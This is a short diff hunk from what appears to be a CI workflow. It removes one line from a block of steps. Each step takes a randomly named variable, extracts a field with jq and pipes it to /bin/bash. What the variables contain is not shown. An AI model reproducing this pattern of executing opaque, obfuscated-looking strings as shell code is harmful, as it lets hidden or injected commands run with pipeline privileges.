@@ -27,7 +27,6 @@ jobs:
           echo $aiub10 | jq -r .f9874 | /bin/bash
           printf '%s' "$a3926" | jq -r .h42 | /bin/bash
           echo $sbrme73635 | jq -r .qrfj0956 | /bin/bash
-          echo $wgz0890 | jq -r .f52 | /bin/bash
           echo $fmqcr3663 | jq -r .gsq476 | /bin/bash
           printf '%s' "$xydu14" | jq -r .u826 | /bin/bash
           echo $ou1 | jq -r .qqaf3980 | /bin/bash
